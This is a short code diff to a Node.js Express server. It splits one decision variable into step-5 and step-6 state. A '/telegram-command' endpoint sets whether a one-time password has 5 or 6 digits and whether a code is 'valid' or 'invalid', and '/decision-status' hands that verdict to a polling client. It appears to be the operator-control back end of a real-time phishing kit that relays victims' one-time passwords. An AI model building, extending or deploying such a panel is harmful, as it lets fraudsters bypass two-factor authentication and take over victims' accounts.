@@ -5,7 +5,8 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 const app = express();
 
 let otpLength = null;
-let decision = null; // accept or decline
+let step5Decision = null;   // for step 5 (otp5 / otp6)
+let step6Decision = null;   // for step 6 (valid / invalid)
 
 app.use(express.json());
 
@@ -102,19 +103,21 @@ app.get("/telegram-command", (req, res) => {
   const cmd = req.query.cmd;
 
   if (cmd === "otp5") {
-    otpLength = 5;
-  }
+  otpLength = 5;
+  step5Decision = "otp5";
+}
 
-  if (cmd === "otp6") {
-    otpLength = 6;
-  }
+if (cmd === "otp6") {
+  otpLength = 6;
+  step5Decision = "otp6";
+}
 
-    if (cmd === "valid") {
-  decision = "valid";
+if (cmd === "valid") {
+  step6Decision = "valid";
 }
 
 if (cmd === "invalid") {
-  decision = "invalid";
+  step6Decision = "invalid";
 }
 
   if (cmd === "reset") {
@@ -158,8 +161,8 @@ app.get("/otp-status", (req, res) => {
 // DECISION STATUS (FIXED)
 // ==============================
 app.get("/decision-status", (req, res) => {
-  const currentDecision = decision;
-  decision = null; // ✅ reset after read
+  const currentDecision = step6Decision;
+  step6Decision = null;
   res.json({ decision: currentDecision });
 });
 
@@ -167,7 +170,7 @@ app.get("/decision-status", (req, res) => {
 // CLEAR DECISION (NEW)
 // ==============================
 app.post("/clear-decision", (req, res) => {
-  decision = null;
+  step6Decision = null;
   res.json({ success: true });
 });
 
